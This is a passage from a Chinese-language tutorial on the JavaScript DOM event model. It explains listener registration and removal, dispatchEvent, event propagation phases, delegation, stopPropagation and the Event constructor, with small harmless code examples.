
<p>上面代码通过匿名函数，向监听函数<code>print</code>传递了一个参数。</p>
<p>监听函数<strong>内部的<code>this</code>，指向当前事件所在的那个对象。</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// HTML 代码如下</span></span><br><span class="line"><span class="comment">// &lt;p id=&quot;para&quot;&gt;Hello&lt;/p&gt;</span></span><br><span class="line"><span class="keyword">var</span> para = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;para&#x27;</span>);</span><br><span class="line">para.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="keyword">function</span> (<span class="params">e</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">nodeName</span>); <span class="comment">// &quot;P&quot;</span></span><br><span class="line">&#125;, <span class="literal">false</span>);</span><br></pre></td></tr></table></figure>

<p>上面代码中，监听函数内部的<code>this</code>指向事件所在的对象<code>para</code>。</p>
<h3 id="3、EventTarget-removeEventListener"><a href="#3、EventTarget-removeEventListener" class="headerlink" title="3、EventTarget.removeEventListener()"></a>3、EventTarget.removeEventListener()</h3><p><code>EventTarget.removeEventListener</code>方法<strong>用来移除<code>addEventListener</code>方法添加的事件监听函数</strong>。该方法没有返回值。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">div.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, listener, <span class="literal">false</span>);</span><br><span class="line">div.<span class="title function_">removeEventListener</span>(<span class="string">&#x27;click&#x27;</span>, listener, <span class="literal">false</span>);</span><br></pre></td></tr></table></figure>

<p><code>removeEventListener</code>方法的参数，与<code>addEventListener</code>方法完全一致。它的第一个参数“事件类型”，大小写敏感。</p>
<p>注意，<code>removeEventListener</code>方法移除的监听函数，必须是<code>addEventListener</code>方法添加的那个监听函数，而且必须在同一个元素节点，否则无效。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">div.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="keyword">function</span> (<span class="params">e</span>) &#123;&#125;, <span class="literal">false</span>);</span><br><span class="line">div.<span class="title function_">removeEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="keyword">function</span> (<span class="params">e</span>) &#123;&#125;, <span class="literal">false</span>);<span class="comment">// 移除无效，因为不是同一个监听函数</span></span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>removeEventListener</code>方法无效，因为监听函数不是同一个匿名函数。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">element.<span class="title function_">addEventListener</span>(<span class="string">&#x27;mousedown&#x27;</span>, handleMouseDown, <span class="literal">true</span>);</span><br><span class="line">element.<span class="title function_">removeEventListener</span>(<span class="string">&quot;mousedown&quot;</span>, handleMouseDown, <span class="literal">false</span>); <span class="comment">// 移除无效，第三个参数不一样</span></span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>removeEventListener</code>方法也是无效的，因为第三个参数不一样。</p>
<h3 id="4、EventTarget-dispatchEvent"><a href="#4、EventTarget-dispatchEvent" class="headerlink" title="4、EventTarget.dispatchEvent()"></a>4、EventTarget.dispatchEvent()</h3><p><code>EventTarget.dispatchEvent</code>方法在当前节点上<strong>触发指定事件，从而触发监听函数的执行。该方法返回一个布尔值</strong>，只要有一个监听函数调用了<code>Event.preventDefault()</code>，则返回值为<code>false</code>，否则为<code>true</code>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">target.<span class="title function_">dispatchEvent</span>(event)</span><br></pre></td></tr></table></figure>

<p><code>dispatchEvent</code>方法的<strong>参数是一个<code>Event</code>对象的实例</strong>（详见《Event 对象》章节）。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">para.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, hello, <span class="literal">false</span>);</span><br><span class="line"><span class="keyword">var</span> event = <span class="keyword">new</span> <span class="title class_">Event</span>(<span class="string">&#x27;click&#x27;</span>);</span><br><span class="line">para.<span class="title function_">dispatchEvent</span>(event);</span><br></pre></td></tr></table></figure>

<p>上面代码在当前节点触发了<code>click</code>事件。</p>
<p>如果<code>dispatchEvent</code>方法的参数为空，或者不是一个有效的事件对象，将报错。</p>
<p>下面代码根据<code>dispatchEvent</code>方法的返回值，<strong>判断事件是否被取消</strong>了。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> canceled = !cb.<span class="title function_">dispatchEvent</span>(event);</span><br><span class="line"><span class="keyword">if</span> (canceled) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;事件取消&#x27;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;事件未取消&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="二、事件模型"><a href="#二、事件模型" class="headerlink" title="二、事件模型"></a>二、事件模型</h2><h3 id="1、监听函数"><a href="#1、监听函数" class="headerlink" title="1、监听函数"></a>1、监听函数</h3><p>浏览器的事件模型，就是通过监听函数（listener）对事件做出反应。事件发生后，浏览器监听到了这个事件，就会执行对应的监听函数。这是事件驱动编程模式（event-driven）的主要编程方式。</p>
<p>JavaScript 有三种方法，可以为事件绑定监听函数。</p>
<h4 id="1-2-HTML-的-on-属性"><a href="#1-2-HTML-的-on-属性" class="headerlink" title="1.2 HTML 的 on- 属性"></a>1.2 HTML 的 on- 属性</h4><p>HTML 语言允许在元素的属性中，直接定义某些事件的监听代码。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">&quot;doSomething()&quot;</span>&gt;</span> <span class="comment">&lt;!-- 加圆括号--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">onclick</span>=<span class="string">&quot;console.log(&#x27;触发事件&#x27;)&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>上面代码为<code>body</code>节点的<code>load</code>事件、<code>div</code>节点的<code>click</code>事件，指定了监听代码。一旦事件发生，就会执行这段代码。</p>
<p>元素的事件监听属性，都是<code>on</code>加上事件名，比如<code>onload</code>就是<code>on + load</code>，表示<code>load</code>事件的监听代码。</p>
<p>注意，这些属性的值是将会执行的代码，而不是一个函数。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 正确 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">&quot;doSomething()&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 错误 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">&quot;doSomething&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>一旦指定的事件发生，<code>on-</code>属性的值是原样传入 JavaScript 引擎执行。因此如果要执行函数，<strong>不要忘记加上一对圆括号</strong>。</p>
<p>使用这个方法指定的监听代码，只会在<strong>冒泡阶段触发</strong>。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">onClick</span>=<span class="string">&quot;console.log(2)&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">button</span> <span class="attr">onClick</span>=<span class="string">&quot;console.log(1)&quot;</span>&gt;</span>点击<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>&lt;button&gt;</code>是<code> &lt;div&gt; </code>的子元素。<code>&lt;button&gt;</code>的<code>click</code>事件，也会触发<code> &lt;div&gt; </code>的<code>click</code>事件。由于<code>on-</code>属性的监听代码，只在冒泡阶段触发，所以点击结果是先输出<code>1</code>，再输出<code>2</code>，即事件<strong>从子元素开始冒泡到父元素。</strong></p>
<p>直接设置<code>on-</code>属性，与通过元素节点的<code>setAttribute</code>方法设置<code>on-</code>属性，效果是一样的。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">el.<span class="title function_">setAttribute</span>(<span class="string">&#x27;onclick&#x27;</span>, <span class="string">&#x27;doSomething()&#x27;</span>);</span><br><span class="line"><span class="comment">// 等同于</span></span><br><span class="line"><span class="comment">// &lt;Element onclick=&quot;doSomething()&quot;&gt;</span></span><br></pre></td></tr></table></figure>



<h4 id="1-2-元素节点的事件属性-例：el-onclick"><a href="#1-2-元素节点的事件属性-例：el-onclick" class="headerlink" title="1.2 元素节点的事件属性 (例：el.onclick)"></a>1.2 元素节点的事件属性 (例：el.onclick)</h4><p>元素节点对象的<strong>事件属性</strong>，同样可以指定监听函数。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="property">onload</span> = doSomething; <span class="comment">// 注意这里是函数名，不加圆括号</span></span><br><span class="line"></span><br><span class="line">div.<span class="property">onclick</span> = <span class="keyword">function</span> (<span class="params">event</span>) &#123; <span class="comment">// onclick是元素的一个属性，它指向一个函数，在触发点击时执行此函数</span></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;触发事件&#x27;</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>使用这个方法指定的监听函数，也是只会在<strong>冒泡阶段触发</strong>。</p>
<p>注意，这种方法与 HTML 的<code>on-</code>属性的差异是，它的值是函数名（<code>doSomething</code>），而不像后者，必须给出完整的监听代码（<code>doSomething()</code>）。</p>
<h4 id="1-3-EventTarget-addEventListener"><a href="#1-3-EventTarget-addEventListener" class="headerlink" title="1.3 EventTarget.addEventListener()"></a>1.3 EventTarget.addEventListener()</h4><p><strong>所有 DOM 节点实例都有<code>addEventListener</code>方法</strong>，用来为该节点定义事件的监听函数。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;load&#x27;</span>, doSomething, <span class="literal">false</span>); <span class="comment">// 注意这里是函数名，不加圆括号</span></span><br></pre></td></tr></table></figure>

<p><code>addEventListener</code>方法的详细介绍，参见<code>EventTarget</code>章节。</p>
<h4 id="1-4-小结"><a href="#1-4-小结" class="headerlink" title="1.4 小结"></a>1.4 小结</h4><p>上面三种方法，</p>
<p>第一种“HTML 的 on- 属性”，违反了 HTML 与 JavaScript 代码相分离的原则，将两者写在一起，不利于代码分工，因此<strong>不推荐使用</strong>。</p>
<p>第二种“元素节点的事件属性”的<strong>缺点</strong>在于，<strong>同一个事件只能定义一个监听函数</strong>，也就是说，如果定义两次<code>onclick</code>属性，后一次定义会覆盖前一次。因此，<strong>也不推荐使用</strong>。</p>
<p>第三种<code>EventTarget.addEventListener</code>是<strong>推荐的指定监听函数的方法</strong>。它有如下优点：</p>
<ul>
<li>同一个事件可以添加多个监听函数。</li>
<li>能够指定在哪个阶段（捕获阶段还是冒泡阶段）触发监听函数。</li>
<li>除了 DOM 节点，其他对象（比如<code>window</code>、<code>XMLHttpRequest</code>等）也有这个接口，它等于是整个 JavaScript 统一的监听函数接口。</li>
</ul>
<h3 id="2、this-的指向-（指向元素节点）"><a href="#2、this-的指向-（指向元素节点）" class="headerlink" title="2、this 的指向 （指向元素节点）"></a>2、this 的指向 （指向元素节点）</h3><p><strong>监听函数内部的<code>this</code>指向触发事件的那个元素节点。（三种事件绑定的this全指向元素节点）</strong></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">&quot;btn&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;console.log(this.id)&quot;</span>&gt;</span>点击<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>执行上面代码，点击后会输出<code>btn</code>。</p>
<p>其他两种监听函数的写法，<code>this</code>的指向也是如此。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// HTML 代码如下</span></span><br><span class="line"><span class="comment">// &lt;button id=&quot;btn&quot;&gt;点击&lt;/button&gt;</span></span><br><span class="line"><span class="keyword">var</span> btn = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;btn&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 写法一</span></span><br><span class="line">btn.<span class="property">onclick</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">id</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 写法二</span></span><br><span class="line">btn.<span class="title function_">addEventListener</span>(</span><br><span class="line">  <span class="string">&#x27;click&#x27;</span>,</span><br><span class="line">  <span class="keyword">function</span> (<span class="params">e</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">id</span>);</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="literal">false</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>上面两种写法，点击按钮以后也是输出<code>btn</code>。</p>
<h3 id="3、事件的传播（捕获、目标、冒泡）"><a href="#3、事件的传播（捕获、目标、冒泡）" class="headerlink" title="3、事件的传播（捕获、目标、冒泡）"></a>3、事件的传播（捕获、目标、冒泡）</h3><p>一个事件发生后，会<strong>在子元素和父元素之间传播</strong>（propagation）。这种传播分成三个阶段。</p>
<ul>
<li><strong>第一阶段</strong>：从<code>window</code>对象传导到目标节点（上层传到底层），称为“<strong>捕获阶段</strong>”（capture phase）。</li>
<li><strong>第二阶段</strong>：在目标节点上触发，称为“<strong>目标阶段</strong>”（target phase）。</li>
<li><strong>第三阶段</strong>：从目标节点传导回<code>window</code>对象（从底层传回上层），称为“<strong>冒泡阶段</strong>”（bubbling phase）。</li>
</ul>
<p>这种三阶段的传播模型，使得同一个事件会在多个节点上触发。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span>点击<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>上面代码中，<code> &lt;div&gt; </code>节点之中有一个<code> &lt;p&gt; </code>节点。</p>
<p>如果对这两个节点，都设置<code>click</code>事件的监听函数（每个节点的捕获阶段和冒泡阶段，各设置一个监听函数），共计设置四个监听函数。然后，对<code> &lt;p&gt; </code>点击，<code>click</code>事件会触发四次。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> phases = &#123;</span><br><span class="line">  <span class="number">1</span>: <span class="string">&#x27;capture&#x27;</span>,</span><br><span class="line">  <span class="number">2</span>: <span class="string">&#x27;target&#x27;</span>,</span><br><span class="line">  <span class="number">3</span>: <span class="string">&#x27;bubble&#x27;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> div = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;div&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> p = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;p&#x27;</span>);</span><br><span class="line"></span><br><span class="line">div.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, callback, <span class="literal">true</span>); <span class="comment">// true 表示在捕获阶段触发</span></span><br><span class="line">p.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, callback, <span class="literal">true</span>); <span class="comment">// true 表示在捕获阶段触发</span></span><br><span class="line">div.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, callback, <span class="literal">false</span>);<span class="comment">// fasle 表示在冒泡阶段触发</span></span><br><span class="line">p.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, callback, <span class="literal">false</span>); <span class="comment">// fasle 表示在冒泡阶段触发</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">callback</span>(<span class="params">event</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> tag = event.<span class="property">currentTarget</span>.<span class="property">tagName</span>; <span class="comment">// 当前目标对象的标签名</span></span><br><span class="line">  <span class="keyword">var</span> phase = phases[event.<span class="property">eventPhase</span>]; <span class="comment">// 触发的阶段</span></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Tag: &#x27;&quot;</span> + tag + <span class="string">&quot;&#x27;. EventPhase: &#x27;&quot;</span> + phase + <span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 点击以后的结果</span></span><br><span class="line"><span class="comment">// Tag: &#x27;DIV&#x27;. EventPhase: &#x27;capture&#x27;  捕获阶段</span></span><br><span class="line"><span class="comment">// Tag: &#x27;P&#x27;. EventPhase: &#x27;target&#x27; 目标阶段</span></span><br><span class="line"><span class="comment">// Tag: &#x27;P&#x27;. EventPhase: &#x27;target&#x27; 目标阶段</span></span><br><span class="line"><span class="comment">// Tag: &#x27;DIV&#x27;. EventPhase: &#x27;bubble&#x27; 冒泡阶段</span></span><br></pre></td></tr></table></figure>

<p>上面代码表示，<code>click</code>事件被触发了四次：<code> &lt;div&gt; </code>节点的捕获阶段和冒泡阶段各1次，<code> &lt;p&gt; </code>节点的目标阶段触发了2次。</p>
<ol>
<li>捕获阶段：事件从<code> &lt;div&gt; </code>向<code> &lt;p&gt; </code>传播时，触发<code> &lt;div&gt; </code>的<code>click</code>事件；</li>
<li>目标阶段：事件从<code> &lt;div&gt; </code>到达<code> &lt;p&gt; </code>时，触发<code> &lt;p&gt; </code>的<code>click</code>事件；</li>
<li>冒泡阶段：事件从<code> &lt;p&gt; </code>传回<code> &lt;div&gt; </code>时，再次触发<code> &lt;div&gt; </code>的<code>click</code>事件。</li>
</ol>
<p>其中，<code> &lt;p&gt; </code>节点有两个监听函数（<code>addEventListener</code>方法第三个参数的不同，会导致绑定两个监听函数），因此它们都会因为<code>click</code>事件触发一次。所以，<code> &lt;p&gt; </code>会在<code>target</code>阶段有两次输出。</p>
<p><strong>注意</strong>，<strong>浏览器总是假定<code>click</code>事件的目标节点，就是点击位置嵌套最深的那个节点</strong>（本例是<code> &lt;div&gt; </code>节点里面的<code> &lt;p&gt; </code>节点）。所以，**<code> &lt;p&gt; </code>节点的捕获阶段和冒泡阶段，都会显示为<code>target</code>阶段。**</p>
<p>事件传播的最上层对象是<code>window</code>，接着依次是<code>document</code>，<code>html</code>（<code>document.documentElement</code>）和<code>body</code>（<code>document.body</code>）。也就是说，上例的事件传播顺序，在捕获阶段依次为<code>window</code>、<code>document</code>、<code>html</code>、<code>body</code>、<code>div</code>、<code>p</code>，在冒泡阶段依次为<code>p</code>、<code>div</code>、<code>body</code>、<code>html</code>、<code>document</code>、<code>window</code>。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">捕获阶段：</span><br><span class="line">window(浏览器对象)--&gt; document(文档对象) --&gt; html --&gt; body --&gt; div --&gt; p (点击目标，在目标阶段)</span><br><span class="line"></span><br><span class="line">冒泡阶段：</span><br><span class="line">p (点击目标，在目标阶段)--&gt; div --&gt; body --&gt; html --&gt; document(文档对象) --&gt; window(浏览器对象)</span><br></pre></td></tr></table></figure>



<h3 id="4、事件的代理"><a href="#4、事件的代理" class="headerlink" title="4、事件的代理"></a>4、事件的代理</h3><p>由于事件会在冒泡阶段向上传播到父节点，因此可以把<strong>子节点的监听函数定义在父节点上，由父节点的监听函数统一处理多个子元素的事件。这种方法叫做事件的代理</strong>（delegation）。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> ul = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;ul&#x27;</span>);</span><br><span class="line"></span><br><span class="line">ul.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="keyword">function</span> (<span class="params">event</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (event.<span class="property">target</span>.<span class="property">tagName</span>.<span class="title function_">toLowerCase</span>() === <span class="string">&#x27;li&#x27;</span>) &#123; <span class="comment">// 浏览器假定click嵌套最深的元素是目标元素</span></span><br><span class="line">    <span class="comment">// some code</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>click</code>事件的监听函数定义在<code>&lt;ul&gt;</code>节点，但是实际上，它处理的是子节点<code>&lt;li&gt;</code>的<code>click</code>事件。这样做的好处是，只要定义一个监听函数，就能处理多个子节点的事件，而不用在每个<code>&lt;li&gt;</code>节点上定义监听函数。而且以后再添加子节点，监听函数依然有效。</p>
<h5 id="阻止事件冒泡-event-stopPropagation"><a href="#阻止事件冒泡-event-stopPropagation" class="headerlink" title="阻止事件冒泡 event.stopPropagation()"></a>阻止事件冒泡 event.stopPropagation()</h5><p>如果希望事件到某个节点为止，不再传播，可以使用事件对象的<code>stopPropagation</code>方法。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 事件传播到 p 元素后，就不再向下传播了</span></span><br><span class="line">p.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="keyword">function</span> (<span class="params">event</span>) &#123;</span><br><span class="line">  event.<span class="title function_">stopPropagation</span>(); <span class="comment">// 该方法在事件对象event上</span></span><br><span class="line">&#125;, <span class="literal">true</span>); <span class="comment">// true表示在捕获阶段绑定事件监听函数</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 事件冒泡到 p 元素后，就不再向上冒泡了</span></span><br><span class="line">p.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="keyword">function</span> (<span class="params">event</span>) &#123;</span><br><span class="line">  event.<span class="title function_">stopPropagation</span>();</span><br><span class="line">&#125;, <span class="literal">false</span>); <span class="comment">// false表示在冒泡阶段（默认值）绑定事件监听函数</span></span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>stopPropagation</code>方法分别在捕获阶段和冒泡阶段，阻止了事件的传播。</p>
<p>但是，**<code>stopPropagation</code>方法只会阻止事件的传播，不会阻止该事件触发<code> &lt;p&gt; </code>节点的其他<code>click</code>事件的监听函数**。也就是说，不是彻底取消<code>click</code>事件。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">p.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="keyword">function</span> (<span class="params">event</span>) &#123;</span><br><span class="line">  event.<span class="title function_">stopPropagation</span>();</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">1</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">p.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="keyword">function</span>(<span class="params">event</span>) &#123;</span><br><span class="line">  <span class="comment">// 会触发</span></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">2</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>p</code>元素绑定了两个<code>click</code>事件的监听函数。<code>stopPropagation</code>方法只能阻止这个事件的传播，不能取消这个事件，因此，第二个监听函数会触发。输出结果会先是1，然后是2。</p>
<p>如果<strong>想要彻底取消该事件</strong>，不再触发后面所有<code>click</code>的监听函数，<strong>可以使用<code>stopImmediatePropagation()</code>方法</strong>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">p.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="keyword">function</span> (<span class="params">event</span>) &#123;</span><br><span class="line">  event.<span class="title function_">stopImmediatePropagation</span>();</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">1</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">p.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="keyword">function</span>(<span class="params">event</span>) &#123;</span><br><span class="line">  <span class="comment">// 不会被触发</span></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">2</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>stopImmediatePropagation</code>方法可以彻底取消这个事件，使得后面绑定的所有<code>click</code>监听函数都不再触发。所以，只会输出1，不会输出2。</p>
<h2 id="三、Event-对象"><a href="#三、Event-对象" class="headerlink" title="三、Event 对象"></a>三、Event 对象</h2><h3 id="1-概述"><a href="#1-概述" class="headerlink" title="1. 概述"></a>1. 概述</h3><p><strong>事件发生以后，会产生一个事件对象，作为参数传给监听函数</strong>。浏览器原生提供一个<code>Event</code>对象，所有的事件都是这个对象的实例，或者说继承了<code>Event.prototype</code>对象。</p>
<p><strong><code>Event</code>对象本身就是一个构造函数，可以用来生成新的实例</strong>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">event = <span class="keyword">new</span> <span class="title class_">Event</span>(type, options);<span class="comment">// 参数一，事件名称； 参数二，事件对象的配置对象</span></span><br></pre></td></tr></table></figure>

<p><code>Event</code>构造函数接受两个参数。第一个参数<code>type</code>是字符串，表示事件的名称；第二个参数<code>options</code>是一个对象，表示事件对象的配置。该对象主要有下面两个属性。</p>
<ul>
<li><code>bubbles</code>：布尔值，可选，默认为<code>false</code>，表示事件对象<strong>是否冒泡</strong>。</li>
<li><code>cancelable</code>：布尔值，可选，默认为<code>false</code>，表示事件<strong>是否可以被取消</strong>，即能否用<code>Event.preventDefault()</code>取消这个事件。一旦事件被取消，就好像从来没有发生过，不会触发浏览器对该事件的默认行为。</li>
</ul>
